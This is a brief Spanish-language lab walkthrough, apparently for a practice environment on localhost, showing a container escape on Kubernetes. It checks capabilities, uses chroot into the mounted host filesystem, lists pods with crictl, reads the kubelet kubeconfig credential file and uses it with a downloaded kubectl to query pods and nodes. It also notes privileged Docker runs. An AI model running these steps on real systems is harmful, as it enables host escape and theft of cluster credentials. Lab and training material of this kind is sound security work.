1. Navegar en http://127.0.0.1:1233

2. Revisar capabilities
```
capsh --print
mount -l
```

3. Explotar vulnerabilidad
```
chroot /host-system/ bash

crictl pods
crictl ps

cat /var/lib/kubelet/kubeconfig
```

4. Usar el kubeconfig:
```
curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/arm64/kubectl"
chmod +x kubectl

./kubectl --kubeconfig /var/lib/kubelet/kubeconfig get pods
./kubectl --kubeconfig /var/lib/kubelet/kubeconfig get nodes
```

Nota: en docker sería similar:
```
docker run --rm -it --privileged ubuntu:22.04 bash
docker run --rm -it --pid=host --privileged ubuntu:22.04 bash
lsblk
```

